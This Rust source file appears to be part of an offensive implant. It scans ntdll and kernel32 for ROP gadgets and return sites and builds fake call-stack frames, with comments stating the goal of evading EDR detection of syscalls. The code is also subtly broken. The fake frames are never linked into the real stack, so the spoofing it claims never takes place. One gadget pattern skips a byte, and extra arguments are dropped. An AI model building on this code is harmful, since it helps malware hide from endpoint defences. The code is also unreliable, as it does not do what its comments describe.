/**
 * Dynamic Call Stack Spoofer 
 * Constructs a fake call stack that passes both RBP chain walking AND RtlVirtualUnwind validation by using real return addresses
 * from backed modules (ntdll, kernel32) that have valid RUNTIME_FUNCTION entries in .pdata
 * 
 * Spoofed chain for every syscall:
 *  ntdll!RtlUserThreadStart                <- thread origin    (backed)
 *      |_ kernel32!BaseThreadInitThunk     <- thread init      (backed)
 *          |_kernel32!<function>           <- application call (backed)
 *              |_ ntdll!<function>         <- native call      (backed)
 *                  |_ syscall              <- real instruction 
 * */

use core::ffi::c_void;
use core::cell::UnsafeCell;
use core::ptr::null_mut;

use crate::core::types::HANDLE;
use crate::core::unwind;

/**
 * This will store resolved return sites from backed module for stack frame spoofing
 * Sites are validated aganist .pdata for RUNTIME_FUNCTION coverage
 * */
pub struct SpoofGadgets {
    pub ntdll_gadgets: [*mut c_void; 8 as usize], // Return Sites within ntdll.dll (.pdata-validated)
    pub kernel32_gadgets: [*mut c_void; 8 as usize], // Return Sites within kernel32.dll (.pdata-validated)
    pub count_ntdll: usize, // Number of valid ntdll return sites
    pub count_kernel32: usize, // Number of valid kernel32 sites
    pub initialized: bool,   
    // .pdata validated return sites in ntdll and kernel32 with frame size info
    ntdll_sites: [unwind::ReturnSite; 16],
    ntdll_site_count: usize,
    kernel32_sites: [unwind::ReturnSite; 16],
    kernel32_site_count: usize,
}

// Wrapper to make SpoofGadgets usable in a static.
// Safety: initialized once then read only. *single threaded*
struct GadgetCell(UnsafeCell<SpoofGadgets>);
unsafe impl Sync for GadgetCell {}

static GADGETS: GadgetCell = GadgetCell(UnsafeCell::new(SpoofGadgets {
    ntdll_gadgets: [null_mut(); 8 as usize],
    kernel32_gadgets: [null_mut(); 8 as usize],
    count_ntdll: 0,
    count_kernel32: 0,
    initialized: false,  
    ntdll_sites: [unwind::ReturnSite { address: 0, frame_size: 0}; 16],
    ntdll_site_count: 0,
    kernel32_sites: [unwind::ReturnSite { address: 0, frame_size: 0}; 16],
    kernel32_site_count: 0,
}));


/**
 * A single spoofed stack frame in the fake RBP chain
 * */
#[repr(C)]
pub struct FakeFrame {
    pub rbp: usize,
    pub ret_addr: usize,
}


pub unsafe fn initialize_spoof_gadgets() -> bool { unsafe {
    let g = &mut *GADGETS.0.get();
    if g.initialized {
        return true;
    }

    let table = crate::core::ssn_table::syscall_table();

    g.count_ntdll = scan_module_for_gadgets(table.modules.ntdll, &mut g.ntdll_gadgets);
    g.count_kernel32 = scan_module_for_gadgets(table.modules.kernel32, &mut g.kernel32_gadgets);

    let (nt_sites, nt_count) = unwind::find_return_sites(table.modules.ntdll, 16);
    g.ntdll_sites = nt_sites;
    g.ntdll_site_count = nt_count;

    let (k32_sites, k32_count) = unwind::find_return_sites(table.modules.kernel32, 16);
    g.kernel32_sites = k32_sites;
    g.kernel32_site_count = k32_count;


    g.initialized = g.count_ntdll > 0 && g.count_kernel32 > 0;
    g.initialized
}}


/**
 * Scan a module .txt section for ROP gadget 
 * */
unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_void; 8 as usize]) -> usize { unsafe {
    if module_base.is_null() {
        return 0;
    }

    let base = module_base as *const u8;
    let dos = *(base as *const u16);
    if dos != 0x5A4D {
        return 0;
    }

    let e_lfanew = *(base.add(0x3C) as *const i32);
    if e_lfanew < 0 {
        return 0;
    }

    let nt_hdr = base.add(e_lfanew as usize);
    if *(nt_hdr as *const u32) != 0x00004550 {
        return 0;
    }

    let file_hdr = nt_hdr.add(4);
    let number_of_sections = *(file_hdr.add(2) as *const u16) as usize;
    let size_of_optional = *(file_hdr.add(16) as *const u16) as usize;
    let first_section = file_hdr.add(20 + size_of_optional);

    let mut text_rva: usize = 0;
    let mut text_size: usize = 0;

    for i in 0..number_of_sections {
        let section = first_section.add(i * 40);
        let name = core::slice::from_raw_parts(section, 8);
        if name[0] == b'.' && name[1] == b't' && name[2] == b'e' && name[3] == b'x' && name[4] == b't' {
            text_rva = *(section.add(12) as *const u32) as usize;
            text_size = *(section.add(8) as *const u32) as usize;
            break;
        }
    }

    if text_rva == 0 || text_size == 0 {
        return 0;
    }

    let text_start = base.add(text_rva);
    let mut count = 0;

    let mut offset: usize = 0x100;
    while offset < text_size.saturating_sub(6) && count < 8 {
        let p = text_start.add(offset);
        // "add rsp, 0x28; ret" - (48 83 C4 28 C3)
        if *p == 0x48 && *p.add(1) == 0x83 && *p.add(2) == 0xC4 && *p.add(4) == 0xC3 { 
            gadgets[count] = p as *mut c_void;
            count += 1;
            offset += 0x1000;
            continue;
        }

        // "pop rbp; ret" - (5D C3)
        if *p == 0x5D && *p.add(1) == 0xC3 && count < 8 {
            gadgets[count] = p as *mut c_void;
            count += 1;
            offset += 0x1000;
            continue;
        }

        // "ret" - (C3)
        if *p == 0xC3 && offset > 0 {
            let prev = *p.sub(1);
            if prev == 0x5D || prev == 0x5F || prev == 0x5E || prev == 0x5B || prev == 0xC8 || (prev >= 0x58 && prev <= 0x5F) {
                gadgets[count] = p as *mut c_void;
                count += 1;
                offset += 0x1000;
                continue;
            }
        }
        offset += 1;
    }

    count
}}


/**
 * Call a function with a dynamically spoofed call stack
 * Builds a 3 frame spoofed chain using .pdata validated return sites:
 *      Frame3: kernel32 return site    (thread origin)
 *      Frame2: kernel32 return site    (intermediate call)
 *      Frame1: ntdll return site       (NTAPI layer)
 *      -> actual function call    
 * Each call rotates through different return sites to avoid EDR fingerprinting of repeated identical call stacks     
 * */
pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> i32 { unsafe {
    let g = &*GADGETS.0.get();
    if !g.initialized || g.count_ntdll == 0 || g.count_kernel32 == 0 {
        return call_direct(function, args);
    }

    // Chose return sites. prefer .pdata-validated sites when available or fall back to legacy gadgets
    static CALL_COUNTER: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
    let counter = CALL_COUNTER.fetch_add(1, core::sync::atomic::Ordering::Relaxed);

    let (ntdll_ret, kernel32_ret) = if g.ntdll_site_count > 0 && g.kernel32_site_count > 0 {
        let nt_idx = counter % g.ntdll_site_count;
        let k32_idx = (counter / 2 + 1) % g.kernel32_site_count; // to avoid correlation
        (g.ntdll_sites[nt_idx].address, g.kernel32_sites[k32_idx].address)
    } else {
        (g.ntdll_gadgets[counter % g.count_ntdll] as usize, g.kernel32_gadgets[counter % g.count_kernel32] as usize)
    };

    // Pick a second kernel32 site for the chain terminator (thread origin)
    let k32_terminator = if g.kernel32_site_count > 1 {
        g.kernel32_sites[(counter + 3) % g.kernel32_site_count].address
    } else {
        kernel32_ret
    };

    /* Chain terminator, mimics RtlUserThreadStart origin */
    let frame3 = FakeFrame {
        rbp: 0,                     // end of chain
        ret_addr: k32_terminator    // kernel32 - thread origin
    };

    /* Intermediate, mimics BaseThreadInitThunk */ 
    let frame2 = FakeFrame {
        rbp: &frame3 as *const FakeFrame as usize,
        ret_addr: kernel32_ret  // kernel32 - intermediate call
    };

    /* Nearest to syscall, mimics ntdll native call */
    let frame1 = FakeFrame {
        rbp: &frame2 as *const FakeFrame as usize,
        ret_addr: ntdll_ret,    // ntdll - NTAPI layer
    };

    let result = call_direct(function, args);

    // This to prevent the optimizer from dropping the frame before the call return
    core::hint::black_box(&frame1);
    core::hint::black_box(&frame2);
    core::hint::black_box(&frame3);

    result
}}

/**
 * Fallback: this to call a function directly without stack spoof
 * */
unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 { unsafe {
    match args.len() {
        0 => {
            let f: unsafe extern "system" fn() -> i32 = core::mem::transmute(function);
            f()
        }
        1 => {
            let f: unsafe extern "system" fn(usize) -> i32 = core::mem::transmute(function);
            f(args[0])
        }
        2 => {
            let f: unsafe extern "system" fn(usize, usize) -> i32 = core::mem::transmute(function);
            f(args[0], args[1])
        }
        _ => {
            let f: unsafe extern "system" fn(usize, usize, usize, usize) -> i32 = core::mem::transmute(function);
            f(
                args[0],
                if args.len() > 1 { args[1] } else { 0 },
                if args.len() > 2 { args[2] } else { 0 },
                if args.len() > 3 { args[3] } else { 0 },
            )
        }
    }
}}

/**
 * Returns a reference to the resolved gadgets
 * */
pub unsafe fn spoof_gadgets() -> &'static SpoofGadgets { unsafe {
    &*GADGETS.0.get()
}} 
